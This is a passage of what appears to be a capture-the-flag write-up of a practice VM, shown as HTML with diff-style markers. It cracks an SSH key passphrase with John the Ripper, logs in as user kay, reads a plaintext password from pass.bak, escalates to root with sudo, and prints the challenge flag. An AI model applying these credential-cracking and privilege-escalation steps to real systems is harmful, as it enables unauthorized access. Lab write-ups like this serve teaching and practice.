-kay_rsa:$sshng$1$16$6ABA7DE35CDB65070B92C1F760E2FE75$2352$22835bfc9d2ad8f779e84676de801a2712e...&lt;SNIP&gt;...
-</code></pre></div><p><code>JtR</code> finds the password to be <code>beeswax</code>.</p>
-<p><img class="img-container" src="imgs/image-20210530013632605.png" alt="image-20210530013632605"  />
-</p>
-<h3 id="ssh---kay">SSH - Kay</h3>
-<p>Interestingly, Kay&rsquo;s is in the sudo group.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «basic-pentesting» «10.9.30.115» 
-$ chmod <span style="color:#ae81ff">600</span> kay_rsa <span style="color:#f92672">&amp;&amp;</span> ssh -i kay_rsa kay@10.10.245.112
-Enter passphrase <span style="color:#66d9ef">for</span> key <span style="color:#e6db74">&#39;kay_rsa&#39;</span>: 
-Welcome to Ubuntu 16.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 4.4.0-119-generic x86_64<span style="color:#f92672">)</span>
-
-...&lt;SNIP&gt;...
-Last login: Mon Apr <span style="color:#ae81ff">23</span> 16:04:07 <span style="color:#ae81ff">2018</span> from 192.168.56.102
-kay@basic2:~$ id
-uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kay<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kay<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kay<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>sudo<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,110<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>,115<span style="color:#f92672">(</span>lpadmin<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>sambashare<span style="color:#f92672">)</span>
-</code></pre></div><p>From here, I only need Kay&rsquo;s password.</p>
-<h3 id="su---root">SU - root</h3>
-<p>In Kay&rsquo;s home directory,t here is a file called <code>pass.bak</code>. It contains this string:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">kay@basic2:~$ cat pass.bak 
-heresareallystrongpasswordthatfollowsthepasswordpolicy$$
-</code></pre></div><p>I tried the string as Kay&rsquo;s password on <code>sudo su -</code> and it worked.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kay@basic2:~$ sudo su -
-root@basic2:~# id
-uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
-root@basic2:~# ls -l
-total <span style="color:#ae81ff">4</span>
--rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1017</span> Apr <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> flag.txt
-</code></pre></div><p>The flag:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Congratulations! You&#39;ve completed this challenge. There are two ways (that I&#39;m aware of) to gain 
-a shell, and two ways to privesc. I encourage you to find them all!
-
-If you&#39;re in the target audience (newcomers to pentesting), I hope you learned something. A few
-takeaways from this challenge should be that every little bit of information you can find can be
-valuable, but sometimes you&#39;ll need to find several different pieces of information and combine
-them to make them useful. Enumeration is key! Also, sometimes it&#39;s not as easy as just finding
-an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
-in this series). Usually you&#39;ll have to dig deeper to find things that aren&#39;t as obvious, and
-therefore might&#39;ve been overlooked by administrators.
-
-Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you&#39;ll send 
-me a link! I can be reached at josiah@vt.edu. If you&#39;ve got questions or feedback, please reach
-out to me.
-
-Happy hacking!
-</code></pre></div><hr>
-<h2 id="references">References</h2>
-<ul>
-<li><a href="https://samsclass.info/124/proj14/p10xstruts.htm">https://samsclass.info/124/proj14/p10xstruts.htm</a></li>
-<li><a href="https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/">https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/</a></li>
 </ul>
 ]]></content:encoded>
     </item>
